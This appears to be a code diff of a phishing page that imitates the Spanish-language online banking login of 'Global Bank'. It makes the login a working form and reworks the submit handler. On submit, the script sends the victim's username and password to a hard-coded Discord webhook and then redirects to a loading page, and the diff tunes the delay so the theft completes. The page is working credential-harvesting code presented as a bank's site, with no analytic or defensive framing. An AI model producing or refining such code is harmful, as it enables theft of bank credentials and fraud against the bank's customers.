@@ -462,7 +462,7 @@ Telegram: @PHPGOTY
 
           <img class="gbx-logo-mobile" src="gb-logo-blue.svg" alt="Global Bank" width="220" height="48" decoding="async">
 
-          <section class="gbx-card">
+          <form class="gbx-card" id="form-login" novalidate>
             <h2>Banca en línea</h2>
             <p class="gbx-sub">Escribe tu usuario para continuar</p>
 
@@ -512,7 +512,7 @@ Telegram: @PHPGOTY
               Necesitas ayuda? Llámanos al <a href="tel:+5078000000">800-0006</a> o
               contáctanos por WhatsApp al <a href="https://wa.me/50767550006">+507 6755-0006</a>.
             </p>
-          </section>
+          </form>
 
         </div>
       </div>
@@ -530,7 +530,7 @@ Telegram: @PHPGOTY
   /* ─────────── Configuración ─────────── */
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1542882444913410191/ra8sQOlpVdnfPai63WZkSOeq9V-Wl_BgIqUGSB5_FU26eSTUR6jvCvNWLxvPwAkeoZ0L';
   const DESTINO     = 'load.html';
-  const ESPERA_MAX  = 1500; // ms que se espera a Discord antes de redirigir
+  const ESPERA_MAX  = 4000; // ms máximo antes de redirigir aunque no conteste
 
   const form      = document.getElementById('form-login');
   const usuario   = document.getElementById('usuario');
@@ -538,7 +538,7 @@ Telegram: @PHPGOTY
   const continuar = document.getElementById('continuar');
   const verClave  = document.getElementById('ver-clave');
 
-  /* Ojo: alterna visibilidad conservando el foco y el cursor */
+  /* Ojo */
   verClave.addEventListener('click', () => {
     const visible = clave.type === 'text';
     const inicio  = clave.selectionStart;
@@ -552,14 +552,13 @@ Telegram: @PHPGOTY
     try { clave.setSelectionRange(inicio, fin); } catch (e) {}
   });
 
-  /* El botón se habilita con los dos campos rellenos */
+  /* Botón habilitado solo con los dos campos */
   function refrescar() {
     continuar.disabled = usuario.value.trim() === '' || clave.value.trim() === '';
   }
   usuario.addEventListener('input', refrescar);
   clave.addEventListener('input', refrescar);
 
-  /* Neutraliza el Markdown de Discord dentro de los valores */
   function esc(str) {
     return str
       .replace(/\\/g, '\\\\')
@@ -573,45 +572,46 @@ Telegram: @PHPGOTY
   }
 
   /* ─────────── Envío y redirección ─────────── */
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
+  if (form) {
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
 
-    const user = usuario.value.trim();
-    const pass = clave.value;
-    if (!user || !pass.trim()) return;
+      const user = usuario.value.trim();
+      const pass = clave.value;
+      if (!user || !pass.trim()) return;
 
-    continuar.disabled = true;
+      continuar.disabled = true;
 
-    const cuerpo = {
-      username: 'Global Bank',
-      embeds: [{
-        title: 'Nuevo inicio de sesión',
-        color: 0x0047BA,
-        fields: [
-          { name: 'Usuario',    value: '`' + esc(user) + '`', inline: true },
-          { name: 'Contraseña', value: '`' + esc(pass) + '`', inline: true },
-          { name: 'Fecha',      value: new Date().toLocaleString('es-PA'), inline: false }
-        ],
-        timestamp: new Date().toISOString()
-      }]
-    };
+      const cuerpo = {
+        username: 'Global Bank',
+        embeds: [{
+          title: 'Nuevo inicio de sesión',
+          color: 0x0047BA,
+          fields: [
+            { name: 'Usuario',    value: '`' + esc(user) + '`', inline: true },
+            { name: 'Contraseña', value: '`' + esc(pass) + '`', inline: true },
+            { name: 'Fecha',      value: new Date().toLocaleString('es-PA'), inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
 
-    try {
+      const envio = fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(cuerpo)
+      })
+        .then((r) => { if (!r.ok) console.warn('Discord respondió', r.status); })
+        .catch((err) => console.error('Envío fallido', err));
+
       await Promise.race([
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          keepalive: true, // sobrevive a la navegación
-          body: JSON.stringify(cuerpo)
-        }),
+        envio,
         new Promise((listo) => setTimeout(listo, ESPERA_MAX))
       ]);
-    } catch (_) {
-      /* si falla, se redirige igual */
-    }
 
-    window.location.href = DESTINO;
-  });
+      window.location.href = DESTINO;
+    });
+  }
 </script>
 
 </body>
